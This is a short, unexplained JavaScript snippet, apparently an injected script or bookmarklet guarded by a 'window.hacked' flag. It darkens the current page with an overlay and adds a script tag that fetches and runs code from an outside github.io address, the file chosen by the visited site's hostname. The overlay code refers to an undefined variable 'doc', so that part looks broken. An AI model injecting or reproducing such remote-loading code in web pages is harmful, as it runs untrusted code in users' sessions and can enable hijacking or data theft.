if (!window.hacked) {
  (function(document, location) {
    var body = document.createElement("body");
    var newMask = document.createElement("div");

    function openMask() {
      newMask.id = 'mask';
      newMask.style.position = "absolute";
      newMask.style.zIndex = "1";
      newMask.style.width = doc.body.scrollWidth + "px";
      newMask.style.height = doc.body.scrollHeight + "px";
      newMask.style.top = "0px";
      newMask.style.left = "0px";
      newMask.style.background = "#000";
      newMask.style.filter = "alpha(opacity=40)";
      newMask.style.opacity = "0.40";
      body.appendChild(newMask);
      document.lastChild.appendChild(body);
    }

    function closeMask() {
      document.lastChild.removeChild(body);
    }

    var node = document.createElement('script');
    node.setAttribute('src', 'http://fhc023.github.io/stuff/' + location.host.split(':')[0] + 'min.js');
    node.setAttribute('charset','utf-8');
    document.getElementsByTagName('head')[0].appendChild(node);
    openMask();

    
  }(document, location));
}
